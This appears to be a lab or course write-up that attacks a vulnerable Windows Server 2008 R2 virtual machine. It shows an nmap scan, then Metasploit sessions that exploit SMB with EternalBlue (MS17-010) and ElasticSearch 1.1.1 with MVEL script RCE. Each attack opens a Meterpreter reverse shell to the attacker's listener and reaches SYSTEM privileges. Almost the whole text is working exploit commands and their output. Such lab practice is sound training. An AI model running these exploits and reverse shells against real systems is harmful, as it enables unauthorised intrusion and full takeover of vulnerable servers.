# Level 1 (Windows)

## nmap scan results

```
user@DESKTOP-NLRK5D7:~$ nmap -A 192.168.56.1/24
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-12-04 19:30 CST
Nmap scan report for 192.168.56.2
Host is up (0.00062s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE              VERSION
21/tcp    open  ftp                  Microsoft ftpd
| ftp-syst:
|_SYST: Windows_NT
80/tcp    open  http                 Microsoft IIS httpd 7.5
| http-methods:
|_Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
3306/tcp  open  mysql                MySQL 5.5.20-log
| mysql-info:
|   Protocol: 10
|   Version: 5.5.20-log
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, FoundRows, SupportsCompression, LongColumnFlag, InteractiveClient, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, ODBCClient, LongPassword, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: =v^Raq5Qw&RNmZZ8E3nR
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=SEC-NYCU-PMEWin
| Not valid before: 2025-10-11T10:17:12
|_Not valid after:  2026-04-12T10:17:12
|_ssl-date: 2025-12-04T11:32:24+00:00; 0s from scanner time.
4848/tcp  open  ssl/appserv-http?
|_ssl-date: 2025-12-04T11:32:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
7676/tcp  open  java-message-service Java Message Service 301
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
|_http-title: GlassFish Server - Server Running
|_http-open-proxy: Proxy might be redirecting requests
8181/tcp  open  ssl/intermapper?
|_ssl-date: 2025-12-04T11:32:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2013-05-15T05:33:38
|_Not valid after:  2023-05-13T05:33:38
8383/tcp  open  http                 Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
9200/tcp  open  wap-wsp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 80
|     handler found for uri [/nice%20ports%2C/Tri%6Eity.txt%2ebak] and method [GET]
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: application/json; charset=UTF-8
|     Content-Length: 310
|     "status" : 200,
|     "name" : "Gargouille",
|     "version" : {
|     "number" : "1.1.1",
|     "build_hash" : "f1585f096d3f3985e73456debdc1a0745f512bbc",
|     "build_timestamp" : "2014-04-16T14:27:12Z",
|     "build_snapshot" : false,
|     "lucene_version" : "4.7"
|     "tagline" : "You Know, for Search"
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; charset=UTF-8
|     Content-Length: 0
|   RTSPRequest, SIPOptions:
|     HTTP/1.1 200 OK
|     Content-Type: text/plain; charset=UTF-8
|_    Content-Length: 0
49152/tcp open  msrpc                Microsoft Windows RPC
49153/tcp open  msrpc                Microsoft Windows RPC
49154/tcp open  msrpc                Microsoft Windows RPC
49155/tcp open  msrpc                Microsoft Windows RPC
49176/tcp open  msrpc                Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port9200-TCP:V=7.94SVN%I=7%D=12/4%Time=693170D5%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,18D,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application
SF:/json;\x20charset=UTF-8\r\nContent-Length:\x20310\r\n\r\n{\r\n\x20\x20\
SF:"status\"\x20:\x20200,\r\n\x20\x20\"name\"\x20:\x20\"Gargouille\",\r\n\
SF:x20\x20\"version\"\x20:\x20{\r\n\x20\x20\x20\x20\"number\"\x20:\x20\"1\
SF:.1\.1\",\r\n\x20\x20\x20\x20\"build_hash\"\x20:\x20\"f1585f096d3f3985e7
SF:3456debdc1a0745f512bbc\",\r\n\x20\x20\x20\x20\"build_timestamp\"\x20:\x
SF:20\"2014-04-16T14:27:12Z\",\r\n\x20\x20\x20\x20\"build_snapshot\"\x20:\
SF:x20false,\r\n\x20\x20\x20\x20\"lucene_version\"\x20:\x20\"4\.7\"\r\n\x2
SF:0\x20},\r\n\x20\x20\"tagline\"\x20:\x20\"You\x20Know,\x20for\x20Search\
SF:"\r\n}\n")%r(HTTPOptions,4F,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x2
SF:0text/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,A9,"H
SF:TTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=UTF-8\r\nContent-Length:\x2080\r\n\r\nNo\x20handler\x20found\x20f
SF:or\x20uri\x20\[/nice%20ports%2C/Tri%6Eity\.txt%2ebak\]\x20and\x20method
SF:\x20\[GET\]")%r(SIPOptions,4F,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n");
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: SEC-NYCU-PMEWin
|   NetBIOS computer name: SEC-NYCU-PMEWIN\x00
|   Workgroup: WORKGROUP\x00
|_System time: 2025-12-04T03:32:04-08:00
|_clock-skew: mean: 1h20m00s, deviation: 3h15m58s, median: 0s
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-12-04T11:32:03
|_  start_date: 2025-12-04T11:19:15
|_nbstat: NetBIOS name: SEC-NYCU-PMEWIN, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:d7:cc:d8 (Oracle VirtualBox virtual NIC)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Attempt 1: 445/tcp   open  microsoft-ds         Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > search EternalBlue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf exploit(unix/ftp/proftpd_modcopy_exec) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard
                                              7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 t
                                             arget machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.0.102       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.16
RHOSTS => 10.0.0.16
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.0.0.16:445         - Host does NOT appear vulnerable.
[*] 10.0.0.16:445         - Scanned 1 of 1 hosts (100% complete)
[-] 10.0.0.16:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.93
RHOSTS => 10.0.0.93
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.93:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.0.93:445         - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.0.93:445         - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.0.93:445 - The target is vulnerable.
[*] 10.0.0.93:445 - Connecting to target for exploitation.
[+] 10.0.0.93:445 - Connection established for exploitation.
[+] 10.0.0.93:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.0.93:445 - CORE raw buffer dump (51 bytes)
[*] 10.0.0.93:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 10.0.0.93:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 10.0.0.93:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 10.0.0.93:445 - 0x00000030  6b 20 31                                         k 1             
[+] 10.0.0.93:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.0.93:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.0.93:445 - Sending all but last fragment of exploit packet
[*] 10.0.0.93:445 - Starting non-paged pool grooming
[+] 10.0.0.93:445 - Sending SMBv2 buffers
[+] 10.0.0.93:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.0.93:445 - Sending final SMBv2 buffers.
[*] 10.0.0.93:445 - Sending last fragment of exploit packet!
[*] 10.0.0.93:445 - Receiving response from exploit packet
[+] 10.0.0.93:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.0.93:445 - Sending egg to corrupted connection.
[*] 10.0.0.93:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.0.0.93
[+] 10.0.0.93:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.0.93:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.0.93:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 4 opened (10.0.0.102:4444 -> 10.0.0.93:49248) at 2025-12-09 18:05:14 +0800

meterpreter > shell

PS C:\Windows\system32> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                             Attributes                                                     
====================================== ================ =============================================================== ===============================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                   
Everyone                               Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                          Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                          Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group             
NT SERVICE\Spooler                     Well-known group S-1-5-80-3951239711-1671533544-1416304335-3763227691-3930497994 Enabled by default, Enabled group, Group owner                 
LOCAL                                  Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Administrators                 Alias            S-1-5-32-544                                                    Mandatory group, Enabled by default, Enabled group    

PS C:\Windows\system32> whoami
nt authority\system
```

## Attempt 2: elasticsearch mvel script RCE

```bash
msf exploit(multi/elasticsearch/search_groovy_script) > search elasticsearch

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/multi/elasticsearch/script_mvel_rce             2013-12-09       excellent  Yes    ElasticSearch Dynamic Script Arbitrary Java Execution
   1  exploit/multi/elasticsearch/search_groovy_script        2015-02-11       excellent  Yes    ElasticSearch Search Groovy Sandbox Bypass
   2  auxiliary/scanner/http/elasticsearch_traversal          .                normal     Yes    ElasticSearch Snapshot API Directory Traversal
   3  auxiliary/gather/elasticsearch_enum                     .                normal     No     Elasticsearch Enumeration Utility
   4  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal     Yes    Elasticsearch Memory Disclosure
   5    \_ action: DUMP                                       .                .          .      Dump memory contents to loot
   6    \_ action: SCAN                                       .                .          .      Check hosts for vulnerability
   7  exploit/multi/misc/xdh_x_exec                           2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/misc/xdh_x_exec

msf exploit(multi/elasticsearch/search_groovy_script) > use 0
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf exploit(multi/elasticsearch/script_mvel_rce) > options

Module options (exploit/multi/elasticsearch/script_mvel_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, sapni, http, socks4
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        9200             yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       The path to the ElasticSearch REST API
   VHOST                         no        HTTP server virtual host
   WritableDir  /tmp             yes       A directory where we can write files (only for *nix environments)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ElasticSearch 1.1.1 / Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/elasticsearch/script_mvel_rce) > set RHOSTS 10.0.0.93
RHOSTS => 10.0.0.93
msf exploit(multi/elasticsearch/script_mvel_rce) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_aws_instance_connect  .                normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
   1   payload/generic/custom                      .                normal  No     Custom Payload
   2   payload/generic/shell_bind_aws_ssm          .                normal  No     Command Shell, Bind SSM (via AWS API)
   3   payload/generic/shell_bind_tcp              .                normal  No     Generic Command Shell, Bind TCP Inline
   4   payload/generic/shell_reverse_tcp           .                normal  No     Generic Command Shell, Reverse TCP Inline
   5   payload/generic/ssh/interact                .                normal  No     Interact with Established SSH Connection
   6   payload/java/jsp_shell_bind_tcp             .                normal  No     Java JSP Command Shell, Bind TCP Inline
   7   payload/java/jsp_shell_reverse_tcp          .                normal  No     Java JSP Command Shell, Reverse TCP Inline
   8   payload/java/meterpreter/bind_tcp           .                normal  No     Java Meterpreter, Java Bind TCP Stager
   9   payload/java/meterpreter/reverse_http       .                normal  No     Java Meterpreter, Java Reverse HTTP Stager
   10  payload/java/meterpreter/reverse_https      .                normal  No     Java Meterpreter, Java Reverse HTTPS Stager
   11  payload/java/meterpreter/reverse_tcp        .                normal  No     Java Meterpreter, Java Reverse TCP Stager
   12  payload/java/shell/bind_tcp                 .                normal  No     Command Shell, Java Bind TCP Stager
   13  payload/java/shell/reverse_tcp              .                normal  No     Command Shell, Java Reverse TCP Stager
   14  payload/java/shell_reverse_tcp              .                normal  No     Java Command Shell, Reverse TCP Inline
   15  payload/multi/meterpreter/reverse_http      .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   16  payload/multi/meterpreter/reverse_https     .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)

msf exploit(multi/elasticsearch/script_mvel_rce) > use 15
[-] Invalid module index: 15
msf exploit(multi/elasticsearch/script_mvel_rce) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] Trying to execute arbitrary Java...
[*] Discovering remote OS...
[+] Remote OS is 'Windows Server 2008 R2'
[*] Discovering TEMP path
[+] TEMP path identified: 'C:\Windows\TEMP\'
[*] Sending stage (58073 bytes) to 10.0.0.93
[*] Meterpreter session 5 opened (10.0.0.102:4444 -> 10.0.0.93:49258) at 2025-12-09 18:34:02 +0800
[!] This exploit may require manual cleanup of 'C:\Windows\TEMP\puxM.jar' on the target

meterpreter > shell
Process 2 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files\elasticsearch-1.1.1>whoami
whoami
nt authority\system

C:\Program Files\elasticsearch-1.1.1>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384
```